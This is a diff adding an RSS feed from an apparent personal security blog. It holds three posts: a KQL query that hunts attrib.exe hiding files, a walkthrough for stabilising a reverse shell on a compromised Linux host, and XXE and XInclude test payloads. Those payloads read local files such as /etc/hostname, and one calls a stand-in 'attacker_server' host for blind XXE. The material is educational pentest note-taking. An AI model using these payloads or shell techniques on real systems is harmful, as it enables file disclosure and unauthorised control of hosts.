@@ -1,0 +1,176 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>Posts on Seth Templet</title>
+        <link>http://localhost:1313/posts/</link>
+        <description>Recent content in Posts on Seth Templet</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>en-us</language>
+        <lastBuildDate>Fri, 03 Apr 2026 00:00:00 +0000</lastBuildDate>
+        <atom:link href="http://localhost:1313/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title></title>
+            <link>http://localhost:1313/posts/attrib-hunting/</link>
+            <pubDate>Fri, 03 Apr 2026 00:00:00 +0000</pubDate>
+            
+            <guid>http://localhost:1313/posts/attrib-hunting/</guid>
+            <description>&lt;h2 id=&#34;checking-for-processes-that-are-hiding-files-in-windows-os&#34;&gt;Checking for processes that are hiding files in Windows OS&lt;/h2&gt;
+&lt;p&gt;This is to help with threat hunting the recent PCPcats TTP.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-kql&#34; data-lang=&#34;kql&#34;&gt;DeviceProcessEvents
+| where FileName =~ &amp;#34;attrib.exe&amp;#34; or ProcessVersionInfoOriginalFileName =~ &amp;#34;attrib.exe&amp;#34;
+| where ProcessCommandLine has &amp;#34;+h&amp;#34;
+| where InitiatingProcessFolderPath has_any (
+    @&amp;#34;windows\system32&amp;#34;,
+    @&amp;#34;windows\syswow64&amp;#34;,
+    @&amp;#34;program files&amp;#34;,
+    @&amp;#34;program files (x86)&amp;#34;,
+    @&amp;#34;windows\&amp;#34;
+)
+| extend suspicious_path = case(
+    ProcessCommandLine matches regex @&amp;#34;(?i)\\Users\\.*\+h&amp;#34;,   
+    ProcessCommandLine matches regex @&amp;#34;(?i)\\Temp\\.*\+h&amp;#34;,        
+    ProcessCommandLine matches regex @&amp;#34;(?i)\\AppData\\.*\+h&amp;#34;,     
+    ProcessCommandLine matches regex @&amp;#34;(?i)\\ProgramData\\.*\+h&amp;#34;,
+    ProcessCommandLine matches regex @&amp;#34;(?i)\\Windows\\.*\+h&amp;#34;, 
+    &amp;#34;Other - Low&amp;#34;
+)
+| project
+    TimeGenerated,
+    DeviceName,
+    AccountName,
+    FolderPath,
+    ProcessCommandLine,
+    InitiatingProcessFolderPath,
+    InitiatingProcessCommandLine,
+    suspicious_path
+| sort by TimeGenerated desc
+&lt;/code&gt;&lt;/pre&gt;</description>
+            <content type="html"><![CDATA[<h2 id="checking-for-processes-that-are-hiding-files-in-windows-os">Checking for processes that are hiding files in Windows OS</h2>
+<p>This is to help with threat hunting the recent PCPcats TTP.</p>
+<pre tabindex="0"><code class="language-kql" data-lang="kql">DeviceProcessEvents
+| where FileName =~ &#34;attrib.exe&#34; or ProcessVersionInfoOriginalFileName =~ &#34;attrib.exe&#34;
+| where ProcessCommandLine has &#34;+h&#34;
+| where InitiatingProcessFolderPath has_any (
+    @&#34;windows\system32&#34;,
+    @&#34;windows\syswow64&#34;,
+    @&#34;program files&#34;,
+    @&#34;program files (x86)&#34;,
+    @&#34;windows\&#34;
+)
+| extend suspicious_path = case(
+    ProcessCommandLine matches regex @&#34;(?i)\\Users\\.*\+h&#34;,   
+    ProcessCommandLine matches regex @&#34;(?i)\\Temp\\.*\+h&#34;,        
+    ProcessCommandLine matches regex @&#34;(?i)\\AppData\\.*\+h&#34;,     
+    ProcessCommandLine matches regex @&#34;(?i)\\ProgramData\\.*\+h&#34;,
+    ProcessCommandLine matches regex @&#34;(?i)\\Windows\\.*\+h&#34;, 
+    &#34;Other - Low&#34;
+)
+| project
+    TimeGenerated,
+    DeviceName,
+    AccountName,
+    FolderPath,
+    ProcessCommandLine,
+    InitiatingProcessFolderPath,
+    InitiatingProcessCommandLine,
+    suspicious_path
+| sort by TimeGenerated desc
+</code></pre>]]></content>
+        </item>
+        
+        <item>
+            <title></title>
+            <link>http://localhost:1313/posts/upgrading-shell/</link>
+            <pubDate>Sat, 03 Dec 2022 00:00:00 +0000</pubDate>
+            
+            <guid>http://localhost:1313/posts/upgrading-shell/</guid>
+            <description>&lt;h2 id=&#34;make-an-interactive-reverse-shell&#34;&gt;Make an interactive reverse shell&lt;/h2&gt;
+&lt;p&gt;It&amp;rsquo;s annoying to get a primitive shell on a linux box so this walkthrough will show you how to create an interactive shell.&lt;/p&gt;
+&lt;p&gt;First check which version of python is installed.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;which python python2 python3
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Next we create our new shell from pty.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 -c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then we background the job back to our attacker box&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;CTRL + Z
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then we set our size and raw&lt;/p&gt;</description>
+            <content type="html"><![CDATA[<h2 id="make-an-interactive-reverse-shell">Make an interactive reverse shell</h2>
+<p>It&rsquo;s annoying to get a primitive shell on a linux box so this walkthrough will show you how to create an interactive shell.</p>
+<p>First check which version of python is installed.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>which python python2 python3
+</span></span></code></pre></div><p>Next we create our new shell from pty.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span></code></pre></div><p>Then we background the job back to our attacker box</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>CTRL + Z
+</span></span></code></pre></div><p>Then we set our size and raw</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>stty size;stty raw -echo;fg
+</span></span></code></pre></div><p>Finally this will bring us back to the reverse shell</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>export TERM<span style="color:#f92672">=</span>xterm-256color
+</span></span></code></pre></div><p>This makes our shell have color, tab completion, and you can backspace without breaking the shell!</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title></title>
+            <link>http://localhost:1313/posts/xxe-attacks/</link>
+            <pubDate>Wed, 17 Feb 2021 00:00:00 +0000</pubDate>
+            
+            <guid>http://localhost:1313/posts/xxe-attacks/</guid>
+            <description>&lt;p&gt;Detection:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-&lt;?xml&#34; data-lang=&#34;&lt;?xml&#34;&gt; &amp;lt;!DOCTYPE example [
+  &amp;lt;!ENTITY file &amp;#34;Hello!&amp;#34;&amp;gt;
+ ]&amp;gt;
+ &amp;lt;example&amp;gt;&amp;amp;file;&amp;lt;/example&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Check for /etc/passwd using SYSTEM keyword&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-&lt;?xml&#34; data-lang=&#34;&lt;?xml&#34;&gt; &amp;lt;!DOCTYPE example [
+  &amp;lt;!ENTITY file SYSTEM &amp;#34;file:///example.txt&amp;#34;&amp;gt;
+ ]&amp;gt;
+ &amp;lt;example&amp;gt;&amp;amp;file;&amp;lt;/example&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;When the SYSTEM keyword does not work, you can replace it with the
+PUBLIC keyword instead. This tag requires you to supply an ID surrounded by
+quotes after the PUBLIC keyword. The parser uses this to generate an alternate
+URL for the value of the entity. For our purposes, you can just use a random
+string in its place&lt;/p&gt;</description>
+            <content type="html"><![CDATA[<p>Detection:</p>
+<pre tabindex="0"><code class="language-<?xml" data-lang="<?xml"> &lt;!DOCTYPE example [
+  &lt;!ENTITY file &#34;Hello!&#34;&gt;
+ ]&gt;
+ &lt;example&gt;&amp;file;&lt;/example&gt; 
+</code></pre><p>Check for /etc/passwd using SYSTEM keyword</p>
+<pre tabindex="0"><code class="language-<?xml" data-lang="<?xml"> &lt;!DOCTYPE example [
+  &lt;!ENTITY file SYSTEM &#34;file:///example.txt&#34;&gt;
+ ]&gt;
+ &lt;example&gt;&amp;file;&lt;/example&gt;
+</code></pre><p>When the SYSTEM keyword does not work, you can replace it with the
+PUBLIC keyword instead. This tag requires you to supply an ID surrounded by
+quotes after the PUBLIC keyword. The parser uses this to generate an alternate
+URL for the value of the entity. For our purposes, you can just use a random
+string in its place</p>
+<pre tabindex="0"><code class="language-<?xml" data-lang="<?xml"> &lt;!DOCTYPE example [
+  &lt;!ENTITY test PUBLIC &#34;abc&#34; &#34;file:///etc/hostname&#34;&gt;
+ ]&gt;
+ &lt;example&gt;&amp;test;&lt;/example&gt;
+</code></pre><p>Testing for blind XXE:</p>
+<pre tabindex="0"><code class="language-<?xml" data-lang="<?xml"> &lt;!DOCTYPE example [
+  &lt;!ENTITY test SYSTEM &#34;http://attacker_server:80/xxe_test.txt&#34;&gt;
+ ]&gt;
+ &lt;example&gt;&amp;test;&lt;/example&gt;
+</code></pre><p>Test for XInclude Attacks
+Sometimes you cannot control the entire XML document or edit the DTD
+of an XML document. But you can still exploit an XXE vulnerability if the
+target application takes your user input and inserts it into XML documents
+on the backend.
+In this situation, you might be able to execute an XInclude attack instead.
+XInclude is a special XML feature that builds a separate XML document from
+a single XML tag named xi:include. If you can control even a single piece of
+unsanitized data passed into an XML document, you might be able to place
+an XInclude attack within that value.
+To test for XInclude attacks, insert the following payload into the
+data entry point and see if the file that you requested gets sent back in the
+response body:</p>
+<pre tabindex="0"><code class="language-<example" data-lang="<example">  &lt;xi:include parse=&#34;text&#34; href=&#34;file:///etc/hostname&#34;/&gt;
+ &lt;/example&gt;
+</code></pre>]]></content>
+        </item>
+        
+    </channel>
+</rss>
